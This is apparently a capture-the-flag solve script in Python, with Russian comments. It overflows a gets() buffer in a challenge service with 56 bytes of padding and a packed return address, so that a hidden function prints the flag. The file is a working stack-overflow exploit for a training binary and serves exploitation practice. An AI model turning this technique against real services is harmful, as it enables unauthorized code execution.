#!/usr/bin/env python3
"""Эксплойт для «Дела о голубом карбункуле»: gets() в desk() перезаписывает
адрес возврата на final_note, которая печатает флаг из /run/case/flag.

Запуск:  python3 solve.py [host] [port]   (по умолчанию 127.0.0.1 13425)
"""

import socket
import struct
import sys

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 13425

with socket.create_connection((host, port), timeout=15) as sock:
    sock.recv(4096)
    # 48 байт буфер note + 8 байт сохранённый rbp -> адрес возврата;
    # final_note = 0x401186 в rilized no-pie билде (см. attachments/carbuncle)
    sock.sendall(b"A" * 56 + struct.pack("<Q", 0x401186) + b"\n")
    sock.shutdown(socket.SHUT_WR)
    print(b"".join(iter(lambda: sock.recv(4096), b"")).decode(), end="")
